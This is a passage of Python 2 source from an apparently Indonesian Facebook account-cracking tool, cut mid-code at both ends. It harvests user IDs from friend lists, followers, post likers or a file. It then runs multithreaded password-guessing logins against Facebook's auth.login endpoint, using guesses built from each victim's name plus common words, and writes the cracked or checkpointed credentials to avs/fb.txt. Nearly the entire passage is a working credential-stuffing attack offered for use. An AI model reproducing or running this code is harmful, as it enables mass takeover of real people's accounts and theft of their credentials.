        jalan('\r\x1b[1;97m[\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Postingan Salah !'
        raw_input('\n\x1b[1;96mEnter Go Back')
        menu()

    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    print 50 * '\x1b[1;94m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                cek = open('avs/fb.txt', 'a')
                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    cek = open('avs/fb.txt', 'a')
                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Sayang'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        cek = open('avs/fb.txt', 'a')
                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Anjing'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            cek = open('avs/fb.txt', 'a')
                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'Bangsat'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                cek = open('avs/fb.txt', 'a')
                                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Indonesia'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    cek = open('avs/fb.txt', 'a')
                                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Rahasia'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        cek = open('avs/fb.txt', 'a')
                                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = 'Katasandi'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            cek = open('avs/fb.txt', 'a')
                                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avs/fb.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    idt = raw_input('\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mID Publik/Friends \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID publik/teman tidak ada !'
        raw_input('\n\x1b[1;97mBack To Menu')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Tidak ada koneksi !'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total Followers \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    print 50 * '\x1b[1;94m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                cek = open('avs/fb.txt', 'a')
                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    cek = open('avs/fb.txt', 'a')
                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Sayang'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        cek = open('avs/fb.txt', 'a')
                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Anjing'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            cek = open('avs/fb.txt', 'a')
                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'Bangsat'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                cek = open('avs/fb.txt', 'a')
                                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Indonesia'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    cek = open('avs/fb.txt', 'a')
                                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Rahasia'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        cek = open('avs/fb.txt', 'a')
                                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = 'Katasandi'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            cek = open('avs/fb.txt', 'a')
                                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avs/fb.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


def passchoice():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m] Crack From FriendList'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m] Crack From Public ID'
    print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m] Crack From File'
    print '\x1b[1;97m[\x1b[1;92m00\x1b[1;97m] Back To Menu'
    print 50 * '\x1b[1;94m-'
    pilih_passxd()


def pilih_passxd():
    peak = raw_input('\x1b[1;97manggaxd/\x1b[1;91m> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_passxd()
    elif peak == '1' or peak == '01':
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        jalan('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Mengambil ID \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2' or peak == '02':
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        idt = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mID Public \x1b[1;91m:\x1b[1;92m ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Name \x1b[1;91m:\x1b[1;92m ' + sp['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Publik/Teman There Is No !'
            raw_input('\n\x1b[1;93m[\x1b[1;97mBack Menu\x1b[1;93m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == '3' or peak == '03':
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        try:
            idlist = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mEnter File Path \x1b[1;91m:\x1b[1;92m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found !'
            raw_input('\n\x1b[1;93m[\x1b[1;97mBack Menu\x1b[1;93m]')
            menu()

    elif peak == '0' or peak == '00':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        passchoice()
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 1  \x1b[1;91m:\x1b[1;97m FirstName123'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 2  \x1b[1;91m:\x1b[1;97m FirstName12345'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 3  \x1b[1;91m:\x1b[1;97m LastName123'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 4  \x1b[1;91m:\x1b[1;97m LastName12345'
    pass5 = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 5  \x1b[1;91m:\x1b[1;97m ')
    pass6 = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 6  \x1b[1;91m:\x1b[1;97m ')
    pass7 = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 7  \x1b[1;91m:\x1b[1;97m ')
    pass8 = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 8  \x1b[1;91m:\x1b[1;97m ')
    pass9 = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 9  \x1b[1;91m:\x1b[1;97m ')
    pass10 = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password 10 \x1b[1;91m:\x1b[1;97m ')
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    print 50 * '\x1b[1;94m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                cek = open('avs/fb.txt', 'a')
                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    cek = open('avs/fb.txt', 'a')
                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        cek = open('avs/fb.txt', 'a')
                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['last_name'] + '12345'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            cek = open('avs/fb.txt', 'a')
                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                cek = open('avs/fb.txt', 'a')
                                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    cek = open('avs/fb.txt', 'a')
                                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        cek = open('avs/fb.txt', 'a')
                                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
